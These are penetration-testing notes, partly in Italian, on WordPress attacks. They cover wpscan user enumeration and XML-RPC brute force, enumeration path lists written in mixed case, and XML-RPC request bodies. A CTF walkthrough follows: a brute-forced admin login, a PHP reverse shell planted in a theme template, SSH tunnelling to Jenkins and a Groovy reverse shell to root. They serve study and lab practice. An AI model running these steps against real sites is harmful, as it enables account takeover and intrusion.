
```
### Wordpress - Tools

### Wpscan:
Tools per scanning automatizzato su CMS Wordpress, sia generico che speicifoc per singoli attacchi.

### Wpscan - UserEnumeration:
> wpscan --url https://<target> --random-user-agent -e u

### Wpscan - Exploit XmlRPC
> wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url https://<target>



### Droopescan:
Alternativa a Wpscan



# Common Attack - Pannelli amministrativi:
> cPanel 2082 - cPanel SSL 2083 -> cpanel.<nomeSito>.com o <nomeSito>:2082
> WHM 2086 - WHM SSL 2087 -> vhm.<nomeSito>.com o <nomeSito>:2086
> Webmail 2096 -> webmail.<nomeSito>.com o <nomeSito>:2096
> PhpMyAdmin -> <nomeSito>/PhPMyAdmin

# Common Attack - Plugin vulnerable
> curl -s https://<nomeSito>/?p=1 | grep plugins
> Search: /wp-content/plugins/<namePlugin>

# Common Attack - Version Wordpress vulnerable
> curl -s https://<nomeSito> | grep WordPress
Search: <meta name="generator" content="WordPress 6.3.1" />

# Common Attack - Search Themes
> curl -s https://<nomeSito> | grep themes

# Common Attack - -WpScan + Searchexploit su tutti i plugin che trova

## User Enumeration:
/wP-jsOn/wP/V2/UsErs/?search={admin}
/wP-jsOn/wP/V2/UsErs/1 
/wP-jsOn/wP/V2/UsErs 
?rest_route=/wp/v2/users
/AuthoR-SiteMap.xml 
/AuthoR/admin
/?author=1
/wp-json/oembed/1.0/embed?url=https://<nomeSito>/&format=json
/wp-json/oembed/1.0/embed?url=https:///<nomeSito>/<users>/&format=json 
/comments/feeds
/feed
public-api.wordpress.com/rest/v1.1/sites/blog.<nomeSito>.com/posts
api.*****.com/wp-json/wp/v2/users?search={admin}

## Altri Path utili:
/Wp-Admin
/Wp-lOgin.PhP
/WP-AdmIn/AdMIn-ajax.php
/Wp-ContEnt/UploAds/WpForms/
/Wp-SiTeMaP.XmL
/PhPMyAdmin



## Page Enumeration:
/?p={id}
/?attachment_id={id}


## Path Vulnerable:
/wp-login.php?action=lostpassword 
/wp-login.php?action=register


## XMLRPC - Wordpress
Verificare che sia disattivata la xxe rpc sui siti Wordpress. 
Se attivo è possibile "Publish a post", "Edit a post", "Delete a post", "Upload a new file", "Get a list of comments", "Edit comments", "PingBack".

# XML Body:
POST /xmlrpc%2ephp 
POST /xmlrpc.php HTTP/1.1 
Host: example.com
Content-Length: 135 

<?xml version="1.0" encoding="utf-8"?>   
<methodCall>    
	<methodName>system.listMethods</methodName>
	<params></params>
</methodCall>

<methodCall> 
	<methodName>wp.getUsersBlogs</methodName> 
	<params><param><value>admin</value></param>
	<param><value>password</value></param></params>
</methodCall>

```


```
## Enumeration ALL
lOGin.pHP
?reSt-rOUte=/Wp/v2/USerS 
xMlrpc.php 
aUTHOr-SiteMap.xMl 
rObOtS.txt 
SiteMap.xMl 
lOGin
lICENSE.Txt
reaDMe.htMl 
?aUTHOr=1 
?aUTHOr=2 
feeD/rSS2
Wp-acTivAte.php 
Wp-lOGin.php?actiOn=regiSter 
Wp-aDMin 
Wp-ADMIN 
WP-ADMIn/Wp-lOGin.pHP 
Wp-ADMIn/lOGin.pHP  
WP-lOGin.pHP 
WP-blOG-heaDer.pHP 
WP-cOMMentS-pOSt.pHP 
WP-cOnFig.pHP 
WP-cOnFig-SaMple.pHP 
WP-cOntEnt 
WP-crOn.pHP 
Wp-inclUDeS 
Wp-inclUDeS/THeMe.pHP 
Wp-inclUDeS/UpDate.pHP 
Wp-inclUDeS/USer.pHP 
Wp-inclUDeS/verSiOn.pHP 
Wp-inclUDeS/Wp-Db.pHP 
Wp-inclUDeS/Wp-Diff.pHP 
Wp-linkS-OpMl.pHP 
Wp-lOaD.pHP 
Wp-lOGin.pHP 
Wp-jSOn/Wp/v2/USerS 
Wp-jSOn/Wp/v2/USerS/1 
Wp-jSOn/Wp/v2/USErS/1 
Wp-Mail.php 
Wp-SettingS.php 
Wp-SignUp.php 
Wp-trackback.php 

```


```
> nmap -sCSV ip
> dirsearch.py -u 10.10.67.11 -E -x 400,500 -r -t 100

Access the site http://10.10.10.10/blog

Modify etc hosts:
> nano /etc/hosts
Add our ip as internal.thm save that 
Now access http://10.10.10.10/blog, got actual web page 

Now go to login page:
internal.thm/blog/wp-login.php

Now run wordpress scan:
> wpscan —url http://internal.thm/blog -e vp,u 
Results: No plugins found and one user found: admin 

Now brute force password:
> wpscan —url http://10.10.10.10/blog -—usernames admin -—passwords /root/Desktop/passes/rockyou.txt -—max-threads 50

Got credentials admin: my2boys
Use the credentials and login to the website 
After gets login, go through the application 
Go to post > private post 
Open that private post 
Got one user credentials william:arnold147

Now upload malicious php and get reverse shell 
In terminal make the netcat listen 
> nc -lvnp 53
Now go to the website
Appearance > Theme editor > 404 template 
Go to tools in your terminal and copy the php-reverse-shell code 
paste the code in 404 template and edit the ip to kali ip and update it
Now go to the 404 template page 
http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
Now in the netcat we get reverse command shell 
Now type the commands in shell 

> id
> ls -la 
> cd /opt 
> ls -la
> cat wp-save.txt
We got one more user cred aubreanna:bubb13guM!@123

Now open new terminal and try to login that user vis ssh 
> ssh aubreanna@10.10.10.10
password: bubb13guM!@123
Got user terminal 
aubreanna@internal> get the user flag here 

aubreanna@internal> ls
aubreanna@internal> jenkins.txt 
Internal jenkins is running on 172.17.0.2:8000
aubreanna@internal> netstat -ano 

Got to the terminal 
> ssh -L 8080:172.17.0.2:8080 auberenna@10.10.10.10 
password: bubb13guM!@#123
Now we got login also with docker0 ip 
Now go to the website and type 127.0.0.1:8080 is the jenkins login page 

Now brute force the password of admin 
Go to burp suite 
capture the login request 
send to intruder
add password
payload use: desktop/customwordlist/kerbrutpass.txt
Got cred admin:spongebob 
login to the website using the credentials 
Manage jenkins> script console 

open netcat listener in aubereana terminal
aubreanna@internal> nc -nvlp 8044 

enter the script from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76 
change cmd = “/bin/sh” 
put your ip in string host 
Now run 

Got reverse shell in netcat listerner
> id
> ls -la
> cd /opt 
> ls -la 
> cat note.txt
Got root credentials root:tr0ub13guM!@#123

Now open the new terminal and login via ssh 
> ssh root@10.10.10.10 
password: tr0ub13guM!@#123
Got root user 

root@internal> la -la
root@internal> cat root.txt 

```